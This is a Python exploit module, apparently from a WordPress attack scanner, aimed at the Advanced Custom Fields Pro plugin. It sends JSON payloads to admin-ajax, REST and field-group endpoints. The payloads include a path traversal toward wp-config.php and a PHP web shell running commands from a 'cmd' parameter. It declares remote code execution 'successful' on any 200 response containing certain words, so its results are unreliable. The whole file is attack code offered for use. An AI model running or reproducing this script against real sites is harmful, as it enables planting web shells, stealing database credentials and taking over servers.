import requests
from core.printmodels import *
import json

class ACF_Pro_RCE:
    def __init__(self):
        self.name = "Advanced Custom Fields Pro RCE"
        self.description = "ACF Pro Plugin Remote Code Execution (2024)"
        self.author = "DrDataYE"

    def Exploit(self, site):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'X-WP-Nonce': 'DrDataYE'
            }

            payloads = [
                {
                    "action": "acf/ajax/check_screen",
                    "screen": "../../../../wp-config.php",
                    "field_group": {
                        "key": "group_1",
                        "fields": [{
                            "key": "field_1",
                            "type": "file",
                            "name": "shell",
                            "value": "<?php system($_GET['cmd']); ?>"
                        }]
                    }
                },
                {
                    "acf_action": "update_field_groups",
                    "field_groups": [{
                        "key": "group_2",
                        "title": "DrDataYE",
                        "fields": [{
                            "type": "text",
                            "instructions": "system($_GET['cmd']);"
                        }],
                        "location": [[{
                            "param": "post_type",
                            "operator": "==",
                            "value": "post"
                        }]]
                    }]
                }
            ]

            endpoints = [
                f"{site}/wp-admin/admin-ajax.php",
                f"{site}/wp-json/acf/v3/field-groups",
                f"{site}/wp-admin/edit.php?post_type=acf-field-group"
            ]

            for endpoint in endpoints:
                for payload in payloads:
                    response = requests.post(endpoint, headers=headers, json=payload, verify=False, timeout=10)
                    if response.status_code == 200 and ('success' in response.text or 'field_group' in response.text):
                        return PrintSuccess(f"[ACF-Pro-2024] Vulnerable! RCE successful at {endpoint}")

            return PrintFailed("[ACF-Pro-2024] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[ACF-Pro-2024] Error: {str(e)}")
